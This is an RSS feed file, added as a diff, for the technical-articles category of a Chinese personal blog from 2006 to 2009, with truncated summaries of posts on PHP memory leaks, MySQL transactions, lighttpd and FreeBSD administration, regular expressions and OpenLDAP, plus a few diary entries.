@@ -1,0 +1,987 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>
+技术文章
+       on 白天’s Blog</title>
+    <link>http://example.org/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/</link>
+    <description>Recent content in 
+技术文章
+       on 白天’s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 10 Jun 2009 16:22:57 +0000</lastBuildDate><atom:link href="http://example.org/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>PHP对象相互引用的内存溢出</title>
+      <link>http://example.org/2009/06/10/phpe5afb9e8b1a1e79bb8e4ba92e5bc95e794a8e79a84e58685e5ad98e6baa2e587ba/</link>
+      <pubDate>Wed, 10 Jun 2009 16:22:57 +0000</pubDate>
+      
+      <guid>http://example.org/2009/06/10/phpe5afb9e8b1a1e79bb8e4ba92e5bc95e794a8e79a84e58685e5ad98e6baa2e587ba/</guid>
+      <description>使用脚本语言最大的好处之一就是可利用其拥有的自动垃圾回收机制（释放内存）。你不需要在使用完变量后做任何释放内存的处理，PHP会帮你完成。
+当然，我们可以按自己的意愿调用 unset() 函数来释放内存，但通常不需要这么做。
+不过在PHP里，至少有一种情况内存不会得到自动释放，即便是手动调用 unset()。详情可考：http://bugs.php.net/bug.php?id=33595。
+问题症状 如果两个对象之间存在着相互引用的关系，如“父对象-子对象”，对父对象调用 unset() 不会释放在子对象中引用父对象的内存（即便父对象被垃圾回收，也不行）。
+有些糊涂了？我们来看下面的这段代码：
+bar = new Bar($this); } } class Bar { function __construct($foo = null) { $this-&amp;gt;foo = $foo; } } while (true) { $foo = new Foo(); unset($foo); echo number_format(memory_get_usage()) . &amp;quot;\n&amp;quot;; } ?&amp;gt; 运行这段代码，你会看到内存使用率越来越高越来越高，直到用光光。
+&amp;hellip;33,551,61633,551,97633,552,33633,552,696PHP Fatal error: Allowed memory size of 33554432 bytes exhausted(tried to allocate 16 bytes) in memleak.php on line 17对大部分PHP程序员来讲这种情况不算是什么问题。
+可如果你在一个长期运行的代码中使用到了一大堆相互引用的对象，尤其是在对象相对较大的情况下，内存会迅速地消耗殆尽。
+Userland解决方案 虽然有些乏味、不优雅，但之前提到的 bugs.php.net 链接中提供了一个解决方案。
+这个方案在释放对象前使用一个 destructor 方法以达到目的。Destructor 方法可将所有内部的父对象引用全部清除，也就是说可以将这部分本来会溢出的内存释放掉。</description>
+    </item>
+    
+    <item>
+      <title>[转]MySQL与事务</title>
+      <link>http://example.org/2009/03/29/e8bdacmysqle4b88ee4ba8be58aa1/</link>
+      <pubDate>Sun, 29 Mar 2009 12:51:33 +0000</pubDate>
+      
+      <guid>http://example.org/2009/03/29/e8bdacmysqle4b88ee4ba8be58aa1/</guid>
+      <description>2006年08月05日 星期六 下午 02:23 作者：老王 MySQL5.X都已经发布好久了，但是还有很多人认为MySQL是不支持事务处理的，这不得不怪他们是孤陋寡闻的，其实，只要你的MySQL版本支持BDB或InnoDB表类型，那么你的MySQL就具有事务处理的能力。这里面，又以InnoDB表类型用的最多，虽然后来发生了诸如Oracle收购InnoDB等令MySQL不爽的事情，但那些商业上的斗争与技术无关，下面以InnoDB表类型为例简单说一下MySQL中的事务。 先来明确一下事务涉及的相关知识： 事务都应该具备ACID特征。所谓ACID是Atomic（原子性），Consistent（一致性），Isolated（隔离性），Durable（持续性）四个词的首字母所写，下面以“银行转帐”为例来分别说明一下它们的含义： 原子性：组成事务处理的语句形成了一个逻辑单元，不能只执行其中的一部分。换句话说，事务是不可分割的最小单元。比如：银行转帐过程中，必须同时从一个帐户减去转帐金额，并加到另一个帐户中，只改变一个帐户是不合理的。 一致性：在事务处理执行前后，数据库是一致的。也就是说，事务应该正确的转换系统状态。比如：银行转帐过程中，要么转帐金额从一个帐户转入另一个帐户，要么两个帐户都不变，没有其他的情况。 隔离性：一个事务处理对另一个事务处理没有影响。就是说任何事务都不可能看到一个处在不完整状态下的事务。比如说，银行转帐过程中，在转帐事务没有提交之前，另一个转帐事务只能处于等待状态。 持续性：事务处理的效果能够被永久保存下来。反过来说，事务应当能够承受所有的失败，包括服务器、进程、通信以及媒体失败等等。比如：银行转帐过程中，转帐后帐户的状态要能被保存下来。 再来看看哪些问题会用到事务处理：
+这里不说“银行转帐”的例子了，说一个大家实际更容易遇到的“网上购书”的例子。先假设一下问题的背景：网上购书，某书（数据库编号为123）只剩最后一本，而这个时候，两个用户对这本书几乎同时发出了购买请求，让我们看看整个过程： 在具体分析之前，先来看看数据表的定义： create table book ( book_id unsigned int(10) not null auto_increment, book_name varchar(100) not null, book_price float(5, 2) not null, #我假设每本书的价格不会超过999.99元 book_number int(10) not null, primary key (book_id) ) type = innodb; #engine = innodb也行 对于用户甲来说，他的动作稍微比乙快一点点，其购买过程所触发的动作大致是这样的： 1. SELECT book_number FROM book WHERE book_id = 123; book_number大于零，确认购买行为并更新book_number 2. UPDATE book SET book_number = book_number - 1 WHERE book_id = 123; 购书成功 而对于用户乙来说，他的动作稍微比甲慢一点点，其购买过程所触发的动作和甲相同： 1.</description>
+    </item>
+    
+    <item>
+      <title>Lighttpd中为php加上open_basedir</title>
+      <link>http://example.org/2009/03/24/lighttpde4b8ade4b8baphpe58aa0e4b88aopen_basedir/</link>
+      <pubDate>Tue, 24 Mar 2009 09:58:30 +0000</pubDate>
+      
+      <guid>http://example.org/2009/03/24/lighttpde4b8ade4b8baphpe58aa0e4b88aopen_basedir/</guid>
+      <description>举例说明 一、
+fastcgi.server = ( &amp;quot;.php&amp;quot; =&amp;gt; (( &amp;quot;socket&amp;quot; =&amp;gt; &amp;quot;/tmp/php-fastcgi.socket&amp;quot;, &amp;quot;bin-path&amp;quot; =&amp;gt; &amp;quot;/usr/bin/php5/bin/php-cgi -d open_basedir=/web/www/php5:/web/www/php&amp;quot;, &amp;quot;max-procs&amp;quot; =&amp;gt; 10, &amp;quot;bin-environment&amp;quot; =&amp;gt; ( &amp;quot;PHP_FCGI_CHILDREN&amp;quot; =&amp;gt; &amp;quot;16&amp;quot;, &amp;quot;PHP_FCGI_MAX_REQUESTS&amp;quot; =&amp;gt; &amp;quot;1000&amp;quot;, ), &amp;quot;broken-scriptfilename&amp;quot; =&amp;gt; &amp;quot;enable&amp;quot; )) ) 二、
+cgi.assign = ( &amp;quot;.php&amp;quot; =&amp;gt; &amp;quot;/usr/bin/php5/bin/php-cgi -d open_basedir=/web/www/php5:/web/www/php&amp;quot; ) </description>
+    </item>
+    
+    <item>
+      <title>利用 portmaster 升級 PHP 5.26 -&gt; 5.28</title>
+      <link>http://example.org/2009/03/19/e588a9e794a8-portmaster-e58d87e7b49a-php-526-528/</link>
+      <pubDate>Thu, 19 Mar 2009 13:12:10 +0000</pubDate>
+      
+      <guid>http://example.org/2009/03/19/e588a9e794a8-portmaster-e58d87e7b49a-php-526-528/</guid>
+      <description>之前在 大神 那边看到一篇 升级 PHP 5.2.8 的一些小细节，就来把我的机器升级一下，发现 php 5.2.7 之后已经把 pcre extension 纳入在裡面，参考 /usr/ports/UPDATING 裡面的 20081211 这个项目，可以利用 portupgrade 或者是 portmaster 来升级，之前都是利用 ruby 写的 portupgrade 来升级系统或者是更新安全性，现在利用 portmaster 这一套也是不错用，portmaster 是用 sh 写出来的，在 gslin 大神这一篇：portupgrade、portmaster、portconf 说到速度方面比 portupgrade 还要好，这我没有实际测试过，自己在实际用了一下，还蛮方便的。
+安装 portmaster 跟 portconf 搭配：
+cd /usr/ports/ports-mgmt/portconf make install clean cd /usr/ports/ports-mgmt/portmaster make install clean 先找出需要升级的套件：
+pkg_version -v 在利用 portmaster 升级 php5
+pkg_delete -f php5-pcre\* portmaster pecl\* portmaster php5\* 如果是利用 portupgrade：
+pkg_delete -f php5-pcre-* pkgdb -F portupgrade -f php5* portupgrade -f pecl* 之前还没升级的时候，利用 portaudit 检查套件的安全性，发现 php5-gd 在 5.</description>
+    </item>
+    
+    <item>
+      <title>软件开发版本及区别</title>
+      <link>http://example.org/2009/03/18/e8bdafe4bbb6e5bc80e58f91e78988e69cace58f8ae58cbae588ab/</link>
+      <pubDate>Wed, 18 Mar 2009 11:49:49 +0000</pubDate>
+      
+      <guid>http://example.org/2009/03/18/e8bdafe4bbb6e5bc80e58f91e78988e69cace58f8ae58cbae588ab/</guid>
+      <description>alpha 内部测试版 beta 外部测试版 demo 演示版 Enhance 增强版或者加强版 属于正式版 Free 自由版 Full version 完全版 属于正式版 shareware 共享版 Release 发行版 有时间限制 Upgrade 升级版 Retail 零售版 Cardware 属共享软件的一种，只要给作者回复一封电邮或明信片即可。（有的作者并由此提供注册码等），目前这种形式已不多见。 Plus 属增强版，不过这种大部分是在程序界面及多媒体功能上增强。 Preview 预览版 Corporation &amp;amp; Enterprise 企业版 Standard 标准版 Mini 迷你版也叫精简版只有最基本的功能 Premium — 贵价版 Professional — 专业版 Express — 特别版 Deluxe — 豪华版 Regged — 已注册版 CN — 简体中文版 CHT — 繁体中文版 EN — 英文版 Multilanguage — 多语言版
+α版 此版本表示该软件仅仅是一个初步完成品，通常只在软件开发者内部交流，也有很少一部分发布给专业测试人员。一般而言，该版本软件的 bug 较多，普通用户最好不要安装。
+β（beta）版 该版本相对于α版已有了很大的改进，消除了严重的错误，但还是存在着一些缺陷，需要经过大规模的发布测试来进一步消除。这一版本通常由软件公司免费发布，用户可从相关的站点下载。通过一些专业爱好者的测试，将结果反馈给开发者，开发者们再进行有针对性的修改。该版本也不适合一般用户安装。</description>
+    </item>
+    
+    <item>
+      <title>转换成utf8成功!</title>
+      <link>http://example.org/2009/03/15/e8bdace68da2e68890utf8e68890e58a9f/</link>
+      <pubDate>Sun, 15 Mar 2009 09:03:55 +0000</pubDate>
+      
+      <guid>http://example.org/2009/03/15/e8bdace68da2e68890utf8e68890e58a9f/</guid>
+      <description>准备从baidu 搬回来哦!</description>
+    </item>
+    
+    <item>
+      <title>模仿IE自动完成功能</title>
+      <link>http://example.org/2007/08/16/e6a8a1e4bbbfiee887aae58aa8e5ae8ce68890e58a9fe883bd/</link>
+      <pubDate>Thu, 16 Aug 2007 09:22:37 +0000</pubDate>
+      
+      <guid>http://example.org/2007/08/16/e6a8a1e4bbbfiee887aae58aa8e5ae8ce68890e58a9fe883bd/</guid>
+      <description>&amp;lt; !DOCTYPE HTML PUBLIC &amp;quot;-//W3C//DTD HTML 4.0 Transitional//EN&amp;quot;&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt; New Document &amp;lt;/title&amp;gt; &amp;lt;meta content=&amp;quot;EditPlus&amp;quot; name=&amp;quot;Generator&amp;quot;&amp;gt; &amp;lt;/meta&amp;gt;&amp;lt;meta content=&amp;quot;&amp;quot; name=&amp;quot;Author&amp;quot;&amp;gt; &amp;lt;/meta&amp;gt;&amp;lt;meta content=&amp;quot;&amp;quot; name=&amp;quot;Keywords&amp;quot;&amp;gt; &amp;lt;/meta&amp;gt;&amp;lt;meta content=&amp;quot;&amp;quot; name=&amp;quot;Description&amp;quot;&amp;gt; &amp;lt;style&amp;gt; body,div { font-family:verdana; line-height:100%; font-size:9pt; } input { width:300px; } h1 { text-align:center; font-size:2.2em; } #divf { margin:10px; font-size:0.8em; text-align:center; } #divc { border:1px solid #333333; } .des { width:500px; background-color:lightyellow; border:1px solid #333; padding:20px; margin-top:20px; } .mouseover { color:#ffffff; background-color:highlight; width:100%; cursor:default; } .</description>
+    </item>
+    
+    <item>
+      <title>今天使用HessianPHP</title>
+      <link>http://example.org/2006/10/30/e4bb8ae5a4a9e4bdbfe794a8hessianphp/</link>
+      <pubDate>Mon, 30 Oct 2006 09:26:43 +0000</pubDate>
+      
+      <guid>http://example.org/2006/10/30/e4bb8ae5a4a9e4bdbfe794a8hessianphp/</guid>
+      <description>今天要做一个bbs的API不知道七夜怎么样的,要我用HessianPHP下载了个看看代码!
+确实他的机制很好,等有时间好好看看,把自己的写的代码贴出来,大家看下!
+service.php
+opendb(); $s_sql = &amp;quot;SELECT * FROM cdb_threads WHERE fid IN($id) ORDER BY lastpost DESC LIMIT $num&amp;quot;; $r_query = mysql_query( $s_sql ); while ( FALSE !== ( $a_rec = mysql_fetch_assoc( $r_query ) ) ){ $show[] = $a_rec; } return $show; } function opendb(){ $dbname = &amp;quot;club&amp;quot;; $conn = mysql_connect(&amp;quot;localhost&amp;quot;,&amp;quot;club&amp;quot;, &amp;quot;club_test&amp;quot;); if(!$conn) die(mysql_error()); @mysql_select_db($dbname, $conn); if(mysql_errno()) die(mysql_error()); return $conn; } } $service = &amp;amp;new; HessianService(); $service-&amp;gt;registerObject(new bbs_api); $service-&amp;gt;displayInfo = true; $service-&amp;gt;service(); ?</description>
+    </item>
+    
+    <item>
+      <title>正则表达式30分钟入门教程。。</title>
+      <link>http://example.org/2006/10/24/e6ada3e58899e8a1a8e8bebee5bc8f30e58886e9929fe585a5e997a8e69599e7a88be38082e38082/</link>
+      <pubDate>Tue, 24 Oct 2006 14:16:00 +0000</pubDate>
+      
+      <guid>http://example.org/2006/10/24/e6ada3e58899e8a1a8e8bebee5bc8f30e58886e9929fe585a5e997a8e69599e7a88be38082e38082/</guid>
+      <description>本文目标30分钟内让你明白正则表达式是什么，并对它有一些基本的了解，让你可以在自己的程序或网页里使用它。一旦入门后，你可以从网上找到更多更详细的资料来继续学习。 别被下面那些复杂的表达式吓倒，只要跟着我一步一步来，你会发现正则表达式其实并不像你想像中的那么困难。当然，如果你看完了这篇教程之后发现自己明白了很多，却又几乎什么都记不得，那也是很正常的&amp;ndash;其实我认为没接触过正则表达式的人在看完这篇教程后能把提到过的语法记住80%以上的可能性为零。这里只是让你明白基本道理，以后你还需要多练习，多查资料，才能熟练掌握正则表达式。 说明正则表达式是用于进行文本匹配的工具，所以本文里多次提到了在字符串里搜索/查找，这种说法的意思是在给定的字符串中，查找与给定的正则表达式相匹配的部分。有可能字符串里有不止一个部分满足给定的正则表达式，这时每一个这样的部分被称为一个匹配。匹配在本文里可能会有三种意思：一种是形容词性的，比如说一个字符串匹配一个表达式；一种是动词性的，比如说在字符串里匹配正则表达式；还有一种是名词性的，就是刚刚说到的“字符串中满足给定的正则表达式的一部分”。 文本格式约定：专业术语 特殊代码/语法格式 正则表达式 正则表达式中的一部分(用于分析) 用于在其中搜索的字符串 对正则表达式或其中一部分的说明 什么是正则表达式？很可能你使用过Windows/Dos下用于文件查找的通配符，也就是和?。如果你想查找某个目录下的所有的Word文档的话，你会搜索.doc。在这里，会被解释成任意的字符串。和通配符类似，正则表达式也是用来进行文本匹配的工具，只不过比通配符更能精确地描述你的需求&amp;ndash;当然，代价就是更复杂。比如你可以编写一个正则表达式来查找所有以0开头，后面跟着2-3个数字，然后是一个连字号“-”，最后是7或8位数字的字符串(像010-12345678或0376-7654321)。 入门在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要。正则表达式就是用于描述这些规则的工具。换句话说，正则表达式就是记录文本规则的代码。例如，\d+就是一个简洁的代码，代表着规则1位或更多位数字，2008就符合这个规则，而A3则不符合(它包含了不是数字的字符)。 学习正则表达式的最好方法是从例子开始，理解例子之后再自己对例子进行修改，实验。下面给出了不少简单的例子，并对它们作了详细的说明。 假设你在一篇英文小说里查找hi，你可以使用正则正则表达式hi。 这是最简单的正则表达式了，它可以精确匹配这样的字符串：由两个字符组成，前一个字符是h,后一个是i。通常，处理正则表达式的工具会提供一个忽略大小写的选项，如果选中了这个选项，它可以匹配hi,HI,Hi,hI。 不幸的是，很多单词里包含hi这两个连续的字符，比如him,history,high等等。用hi来查找的话，这里边的hi也会被找出来。如果要精确地查找hi这个单词的话，我们应该使用\bhi\b。 \b是正则表达式规定的一个特殊代码，代表着单词的开头或结尾。虽然通常英文的单词是由空格或标点符号或换行为分隔的，但是\b并不代表这些单词分隔符中的任何一个，只代表一个位置。 假如你要找的是hi后面不远处跟着一个Lucy，你应该用\bhi\b.\bLucy\b。 这里，.是另一个特殊代码，代表除了换行符以外的任意字符。同样是特殊的代码，不过它代表的不是字符，也不是位置，而是数量&amp;ndash;它指定前边的内容可以重复任意次以使整个表达式得到匹配。因此，.连在一起就意味着任意数量的不包含换行的字符。现在\bhi\b.\bLucy\b的意思就很明显了：先是一个单词hi,然后是任意个任意字符(但不能是换行)，最后是Lucy这个单词。 如果同时使用其它的一些特殊代码，我们就能构造出功能更强大的正则表达式。比如下面这个例子： 0\d\d-\d\d\d\d\d\d\d\d代表着这样的字符串：以0开头，然后是两个数字，然后是一个连字号“-”，最后是8个数字(也就是中国的电话号码，当然，这个例子只能匹配区号为3位的情形，想同时匹配区号为4位的话，请在教程的下面寻找答案)。 这里的\d是一个新的特殊代码，代表任意的数字(0，或1，或2，或。。。)。-不是特殊代码，只代表它本身&amp;ndash;连字号。 为了避免那么多烦人的重复，我们也可以这样写这个表达式：0\d{2}-\d{8} 这里\d后面的{2}({8})指定的是前面\d必须连续重复出现2次(8次)。 测试正则表达式如果你不觉得正则表达式很难读写的话，要么你是一个天才，要么，你不是地球人。正则表达式的语法很令人头疼，即使对经常使用它的人来说也是如此。由于难于读写，容易出错，所以很有必要创建一种工具来测试正则表达式。 由于在不同的环境下正则表达式的一些细节是不相同的，本教程介绍的是Microsoft .net下正则表达式的行为，所以，我向你介绍一个.net下的工具The Regulator。首先你确保已经安装了.net Framework1.1，然后下载The Regulator，下载完后打开压缩包，运行setup.exe安装。 下面是the Regulator运行时的截图：
+特殊代码现在你已经知道几个具有特殊意义的代码了，如\b,.,*，还有\d.事实上还有更多的特殊代码，比如\s代表任意的空白符，包括空格，制表符(Tab),换行符。\w代表着字母或数字。 下面来试试更多的例子：
+\ba\w*\b匹配以字母a开头的单词-先是某个单词开始处(\b)，然后是字母a,然后是任意数量的字母或数字(\w*)，最后是单词结束处(\b)。 \d+匹配1个或更多连续的数字。这里的+是和*类似的特殊代码，不同的是*代表重复任意次(可能是0次)，而+则代表重复1次或更多次。 \b\w{6}\b 匹配刚好6个字母/数字的单词。 . 匹配除换行符以外的任意字符 \w 匹配字母或数字 \s 匹配任意的空白符 \d 匹配数字 \b 匹配单词的开始或结束 ^ 匹配字符串的开始 $ 匹配字符串的结束 特殊代码^以及$和\b有点类似，都匹配一个位置。^匹配你要用来查找的字符串的开头，$匹配结尾。这两个代码在验证输入的内容时非常有用，比如一个网站如果要求你填写的QQ号必须为5位到12位数字时，可以使用：^\d{5,12}$。 这里的{5,12}和前面介绍过的{2}是类似的，只不过{2}代表只能不多不少重复2次，{5,12}则是必须重复最少5次，最多12次，否则都不匹配。 因为使用了^和$，所以输入的整个字符串都要用来和\d{5,12}来匹配，也就是说整个输入必须是5到12个数字，因此如果输入的QQ号能匹配这个正则表达式的话，那就符合要求了。 和忽略大小写的选项类似，有些正则表达式处理工具还有一个处理多行的选项。如果选中了这个选项，^和$的意义就变成了匹配行的开始处和结束处。 字符转义如果你想查找特殊代码本身的话，比如你查找.,或者*,就出现了问题：你没法指定它们，因为它们会被解释成其它的意思。这时你就必须使用\来取消这些字符的特殊意义。因此，你应该使用\.和\*。当然，要查找\本身，你也得用\\. 例如：www\.unibetter\.com匹配www.unibetter.com，c:\\windows匹配c:\windows,2\^8匹配2^8(通常这是2的8次方的书写方式)。 重复你已经看过了前面的*,+,{2},{5,12}这几个代表重复的方式了。下面是正则表达式中所有指定重复的方式： * 重复零次或更多次 + 重复一次或更多次 ? 重复零次或一次 {n} 重复n次 {n,} 重复n次或更多次 {n,m} 重复n到m次 下面是一些使用重复的例子： Windows\d+匹配Windows后面跟1个或更多数字 13\d{9}匹配以13后面跟9个数字(中国的手机号) ^\w+匹配一行的第一个单词(或整个字符串的第一个单词，具体代表哪个意思得看选项设置) 字符类要想查找数字，字母或数字，空白是很简单的，因为已经有了对应这些字符集的特殊代码，但是如果你想匹配没有预定义特殊代码的字符集比如元音字母(a,e,i,o,u),怎么办？ 很简单，你只需要在中括号里列出它们就行了，像[aeiou]就匹配任何一个元音字母，[.</description>
+    </item>
+    
+    <item>
+      <title>freebsd cp命令</title>
+      <link>http://example.org/2006/10/15/freebsd-cpe591bde4bba4/</link>
+      <pubDate>Sun, 15 Oct 2006 08:19:22 +0000</pubDate>
+      
+      <guid>http://example.org/2006/10/15/freebsd-cpe591bde4bba4/</guid>
+      <description>文件 cp xx /xx/xx
+文件夹 cp -Rp xx /xxx/xxx</description>
+    </item>
+    
+    <item>
+      <title>今天觉得不爽！</title>
+      <link>http://example.org/2006/09/06/e4bb8ae5a4a9e8a789e5be97e4b88de788bdefbc81/</link>
+      <pubDate>Wed, 06 Sep 2006 10:20:30 +0000</pubDate>
+      
+      <guid>http://example.org/2006/09/06/e4bb8ae5a4a9e8a789e5be97e4b88de788bdefbc81/</guid>
+      <description>觉得太不顺心了，我看我在这里也就这样了，不知几个月后会怎么样，明天还要完成项目，，唉，回去想吧！想吧！想吧！</description>
+    </item>
+    
+    <item>
+      <title>当前提升博客访问量的十大绝招!</title>
+      <link>http://example.org/2006/08/25/e5bd93e5898de68f90e58d87e58d9ae5aea2e8aebfe997aee9878fe79a84e58d81e5a4a7e7bb9de68b9b/</link>
+      <pubDate>Fri, 25 Aug 2006 06:42:47 +0000</pubDate>
+      
+      <guid>http://example.org/2006/08/25/e5bd93e5898de68f90e58d87e58d9ae5aea2e8aebfe997aee9878fe79a84e58d81e5a4a7e7bb9de68b9b/</guid>
+      <description>你想提升你的博客访问量吗?? 经过这么一年的积累，阅博无数的情况下,我终于总结出了十大绝招。以表娱乐。
+１，赞扬百度，说百度多么的公正，技术多么先进。
+－文章一出，立即有一帮人用口水淹死你。 ２，写你是怎样将一热门关键词排到google的第一名的？ －保证有无数人慕名而来。
+３，一天骂一人。当前谁最火你就骂谁。 －学习宋祖德
+４，天天写文章说你自己多么伟大和高尚 －脸皮要象芙蓉姐姐一样　５，找个美女合作，你写文章，挂她的名字和照片 －不火也难
+６。keso评论别人，你每天只管再评论keso。 －越快越好，keso文章一出，你的评论立即诞生
+７，介绍实施各种各样的“流氓式”营销的实际操作经验 －保证比网络营销，搜索引擎营销还火
+８，对外高调宣布，谁敢访问你的博客，你就要起诉谁
+９，告诉别人你是如何通过QQ找到一夜情的 －需要现身说法的
+１０，不断提供非常有新意和有远见的相关分析或专业知识。</description>
+    </item>
+    
+    <item>
+      <title>回到北京．来到网友！</title>
+      <link>http://example.org/2006/07/17/e59b9ee588b0e58c97e4baacefbc8ee69da5e588b0e7bd91e58f8befbc81/</link>
+      <pubDate>Mon, 17 Jul 2006 10:38:12 +0000</pubDate>
+      
+      <guid>http://example.org/2006/07/17/e59b9ee588b0e58c97e4baacefbc8ee69da5e588b0e7bd91e58f8befbc81/</guid>
+      <description>拿着那么多书，又来到北京好累呀，昨天是小宝宝
+唉，可到最后确弄成这样，其家大家在一块很开心，弄成这样何必呢！
+第一天网友上班，早上地铁人多的受不了，上了一天班，玩了一天，不知明天会怎么样呀！</description>
+    </item>
+    
+    <item>
+      <title>PHP判断浏览器类型和系统语言</title>
+      <link>http://example.org/2006/06/05/phpe588a4e696ade6b58fe8a788e599a8e7b1bbe59e8be5928ce7b3bbe7bb9fe8afade8a880/</link>
+      <pubDate>Mon, 05 Jun 2006 00:52:27 +0000</pubDate>
+      
+      <guid>http://example.org/2006/06/05/phpe588a4e696ade6b58fe8a788e599a8e7b1bbe59e8be5928ce7b3bbe7bb9fe8afade8a880/</guid>
+      <description>判断浏览器类型 echo $_SERVER[&amp;ldquo;HTTP_USER_AGENT&amp;rdquo;]; ?&amp;gt; 判断系统语言 echo $_SERVER[&amp;ldquo;HTTP_ACCEPT_LANGUAGE&amp;rdquo;]; ?&amp;gt;</description>
+    </item>
+    
+    <item>
+      <title>apache mod_limitipconn 的配置方法</title>
+      <link>http://example.org/2006/05/26/apache-mod_limitipconn-e79a84e9858de7bdaee696b9e6b395/</link>
+      <pubDate>Fri, 26 May 2006 18:25:01 +0000</pubDate>
+      
+      <guid>http://example.org/2006/05/26/apache-mod_limitipconn-e79a84e9858de7bdaee696b9e6b395/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>下拉菜单出现在flash下面</title>
+      <link>http://example.org/2006/05/20/e4b88be68b89e88f9ce58d95e587bae78eb0e59ca8flashe4b88be99da2/</link>
+      <pubDate>Sat, 20 May 2006 10:37:29 +0000</pubDate>
+      
+      <guid>http://example.org/2006/05/20/e4b88be68b89e88f9ce58d95e587bae78eb0e59ca8flashe4b88be99da2/</guid>
+      <description>可以这样理解 下拉菜单通过执行一次显示命令出现在画面上,但是FLASH这样的动画不停地在执行显示命令(因为动画是动的呵呵),每次都更新了画面的显示,所以如果两者重叠,就会因为FLASH显示了新图象画面,下拉菜单的画面被覆盖. 解决办法: 方法一:把swf文件属性设置成透明，在flash参数里面加上 ，如果你用dreamweaver，选中那个swf文件，属性面板上会有一个“参数&amp;hellip;”按钮（在面板的最下面），点一下，在弹出框里左边“参数”下面加上wmode，对应右边的值输入transparent，确定后就可以了 方法二:dreamweaver有个排列的，把swf文件设置在最底层不就行了！</description>
+    </item>
+    
+    <item>
+      <title>阿新FreeBSD服务器安装流程</title>
+      <link>http://example.org/2006/05/16/e998bfe696b0freebsde69c8de58aa1e599a8e5ae89e8a385e6b581e7a88b/</link>
+      <pubDate>Tue, 16 May 2006 12:42:38 +0000</pubDate>
+      
+      <guid>http://example.org/2006/05/16/e998bfe696b0freebsde69c8de58aa1e599a8e5ae89e8a385e6b581e7a88b/</guid>
+      <description>如果简单安装一个web服务器 FreeBSD 安装是非常傻瓜和友好的
+1，安装系统 我的分区 120G为例 256M / 2048M swap (1G内存) 10240M /var 4096M /usr 1024M /home 1025M /tmp 剩下的 /pub 实验证明 这种分区目前美掉过数据 选择MINI安装，FreeBSD安装可能是所有系统中最快的，大概 4-5分钟 2，系通更新 cvsup down回来最新的源代码 cd /usr/src make buildworld 修改内核 make buildkernel KERNCONF=NEWKERNEL make installkernel KERNCONF=NEWKERNEL make installworld mergemaster -cv 输入 i 安装新的 reboot 正常启动 系统更新ok 这是个漫长的过程，这段时间我一般都在CS 3，安装应用程序 cvsup down回最新的ports库 1,perl cd /usr/ports/lang/perl5.8 make install clean 2,apache cd /usr/ports/lang/apache13-modssl make APACHE_HARD_SERVER_LIMIT=1024 install clean APACHE_HARD_SERVER_LIMIT=1024 apache最大连接数 3,mysql cd /usr/ports/databases/mysql40-server make WITH_CHARSET=gbk WITH_XCHARSET=all WITH_OPENSSL=yes WITH_PROC_SCOPE_PTH=yes BUILD_OPTIMIZED=yes install clean 进站了 在火车上再写 继续 4.</description>
+    </item>
+    
+    <item>
+      <title>OpenLDAP学习笔记</title>
+      <link>http://example.org/2006/04/30/openldape5ada6e4b9a0e7ac94e8aeb0/</link>
+      <pubDate>Sun, 30 Apr 2006 11:06:06 +0000</pubDate>
+      
+      <guid>http://example.org/2006/04/30/openldape5ada6e4b9a0e7ac94e8aeb0/</guid>
+      <description>Copyright ? 2004，2005， 本文遵从GNU 的自由文档许可证(Free Document License)的条款，欢迎转载、修改、散布。
+发布时间:2004年04月07日
+最近更新:2005年08月08日
+Abstract
+LDAP(轻量级目录服务访问协议，Lightweight Directory Access Protocol)基于X.500标准，支持TCP/IP，使用简单方便。现在越来越多的网络应用系统都支持LDAP。OpenLDAP是LDAP的一种开源实现，本笔记基于OpenLDAP2.1.29。 Table of Contents
+目录服务简介 1.1. X.500和LDAP 1.2. LDAP产品 OpenLDAP安装笔记 2.1. 源码安装 2.2. 数据录入 2.2.1. 手动录入方法 2.2.2. 文件方式 2.2.3. 脚本方式 2.3. 常用命令介绍 2.4. 启用sasl验证 2.5. 配置服务器复制 管理工具 3.1. phpldapadmin 3.2. gq 3.3. CPU 3.4. JXplore HowTo 4.1. 禁止整个服务器的匿名访问 Chapter 1. 目录服务简介 Table of Contents 1.1. X.500和LDAP 1.2. LDAP产品 目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它成树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。目录服务是由目录数据库和一套访问协议组成的系统。类似以下的信息适合储存在目录中：
+企业员工和企业客户之类人员信息；
+公用证书和安全密钥；
+邮件地址、网址、IP等电脑信息；
+电脑配置信息。
+&amp;hellip;
+1.1. X.500和LDAP 现在国际上的目录服务标准有两个，一个是较早的X.500标准，一个是较新的LDAP标准。</description>
+    </item>
+    
+    <item>
+      <title>开源或免费虚拟主机管理系统</title>
+      <link>http://example.org/2006/04/30/e5bc80e6ba90e68896e5858de8b4b9e8999ae68b9fe4b8bbe69cbae7aea1e79086e7b3bbe7bb9f/</link>
+      <pubDate>Sun, 30 Apr 2006 04:28:14 +0000</pubDate>
+      
+      <guid>http://example.org/2006/04/30/e5bc80e6ba90e68896e5858de8b4b9e8999ae68b9fe4b8bbe69cbae7aea1e79086e7b3bbe7bb9f/</guid>
+      <description>ZPanel - 在Windows下的免费Hosting Panel 网址： http://sourceforge.net/projects/zpanel/ http://www.thezpanel.com/
+中文讨论： http://www.twftp.org/phpbb/viewtopic.php?t=3104
+web-cp - *nix的虚拟主机管理 网址： http://sourceforge.net/projects/webcp/ http://www.web-cp.net/
+中文讨论： http://www.twftp.org/phpbb/viewtopic.php?t=5095
+VHCS - Virtual Hosting Control System - 一样是*nix系统的，不过比ZPanel还热门喔 网址： http://sourceforge.net/projects/vhcs/ http://www.vhcs.net/
+其他的：
+http://sourceforge.net/search/?words=hosting
